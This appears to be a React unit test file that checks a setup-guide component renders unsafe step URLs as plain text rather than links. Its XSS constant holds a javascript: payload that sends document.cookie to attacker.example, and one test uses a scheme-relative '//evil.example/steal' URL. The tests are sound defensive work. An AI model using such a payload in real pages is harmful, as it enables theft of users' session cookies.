// SPDX-License-Identifier: Apache-2.0

/**
 * Call-site coverage for the publisher-controlled setup-guide URL boundary.
 */

import { describe, it, expect } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { I18nextProvider } from "react-i18next";
import i18n, { i18nReady } from "../../../i18n.ts";
import { SetupGuideSteps } from "../setup-guide-steps.tsx";

await i18nReady;
await i18n.changeLanguage("fr");

const XSS = "javascript:fetch('https://attacker.example/'+document.cookie)";

function renderSteps(steps: ReadonlyArray<{ label: string; url?: string }>): string {
  return renderToStaticMarkup(
    <I18nextProvider i18n={i18n}>
      <SetupGuideSteps steps={steps} />
    </I18nextProvider>,
  );
}

describe("SetupGuideSteps step link", () => {
  it("links a legitimate https step url", () => {
    const html = renderSteps([{ label: "Créer une app OAuth", url: "https://console.acme.test" }]);
    expect(html).toContain('href="https://console.acme.test/"');
    expect(html).toContain("Créer une app OAuth");
  });

  it("renders a javascript: step url as plain text", () => {
    const html = renderSteps([{ label: "Créer une app OAuth", url: XSS }]);
    expect(html).not.toContain("href");
    expect(html).not.toContain("<a ");
    expect(html).toContain("Créer une app OAuth");
  });

  it("renders a scheme-relative step url as plain text", () => {
    const html = renderSteps([{ label: "Étape", url: "//evil.example/steal" }]);
    expect(html).not.toContain("href");
    expect(html).toContain("Étape");
  });

  it("keeps the existing no-url rendering", () => {
    const html = renderSteps([{ label: "Étape sans lien" }]);
    expect(html).not.toContain("href");
    expect(html).toContain("Étape sans lien");
  });

  it("guards each step independently", () => {
    const html = renderSteps([
      { label: "Sûr", url: "https://ok.example/" },
      { label: "Hostile", url: XSS },
    ]);
    expect(html).toContain('href="https://ok.example/"');
    expect(html).not.toContain("javascript:");
  });
});
